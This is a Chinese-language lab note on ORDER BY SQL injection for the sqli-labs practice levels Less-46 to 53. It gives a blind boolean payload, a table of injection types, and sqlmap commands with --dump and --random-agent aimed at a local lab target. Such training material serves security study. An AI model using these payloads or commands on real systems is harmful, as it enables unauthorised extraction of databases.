# ORDER BY 注入 (Less-46 ~ Less-53)

## 特点

注入点在 `ORDER BY` 子句后，而非 `WHERE` 条件中：

```sql
SELECT * FROM users ORDER BY $sort
```

**限制：**
1. UNION SELECT 不适用 — ORDER BY 在 UNION 之后执行
2. 通常只能使用报错注入或盲注
3. sqlmap 会自动识别并调整策略

**盲注利用思路：**

```sql
-- 通过排序结果的变化来判断条件真伪
?sort=(SELECT IF(SUBSTRING(database(),1,1)='s', 1, 2))
-- 如果 database() 首字母是 's'，按第1列排序，否则按第2列
-- 观察页面排序结果即可推断
```

## 注入类型对照

| Less | 参数 | 闭合方式 | 堆叠 | 回显 |
|------|------|---------|------|------|
| 46 | `?sort=1` | 数字型 | -- | 有 |
| 47 | `?sort=1` | 单引号 | -- | 有 |
| 48 | `?sort=1` | 数字型 | -- | 无（盲注） |
| 49 | `?sort=1` | 单引号 | -- | 无（盲注） |
| 50 | `?sort=1` | 数字型 | 是 | 有 |
| 51 | `?sort=1` | 单引号 | 是 | 有 |
| 52 | `?sort=1` | 数字型 | 是 | 无（盲注） |
| 53 | `?sort=1` | 单引号+括号 | 是 | 无（盲注） |

## 配置

```bash
TARGET="http://localhost:8080"
RESULTS_DIR="./results"
```

## 执行命令

### Less-46: 数字型 + ORDER BY

```bash
sqlmap -u "$TARGET/Less-46/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-46"
```

### Less-47: 单引号 + ORDER BY

```bash
sqlmap -u "$TARGET/Less-47/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-47"
```

### Less-48: 数字型 + ORDER BY + 盲注

```bash
sqlmap -u "$TARGET/Less-48/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-48"
```

### Less-49: 单引号 + ORDER BY + 盲注

```bash
sqlmap -u "$TARGET/Less-49/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-49"
```

### Less-50: 数字型 + ORDER BY + 堆叠

```bash
sqlmap -u "$TARGET/Less-50/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-50"
```

### Less-51: 单引号 + ORDER BY + 堆叠

```bash
sqlmap -u "$TARGET/Less-51/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-51"
```

### Less-52: 数字型 + ORDER BY + 堆叠 + 盲注

```bash
sqlmap -u "$TARGET/Less-52/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-52"
```

### Less-53: 单引号+括号 + ORDER BY + 堆叠 + 盲注

```bash
sqlmap -u "$TARGET/Less-53/?sort=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --technique=B --dump --output-dir="$RESULTS_DIR/Less-53"
```

---

> 参考：[sqlmap 完整手册](sqlmap.md) | [注入类型详解](../notes/injection-types.md) | [靶场总览](../notes/overview.md)
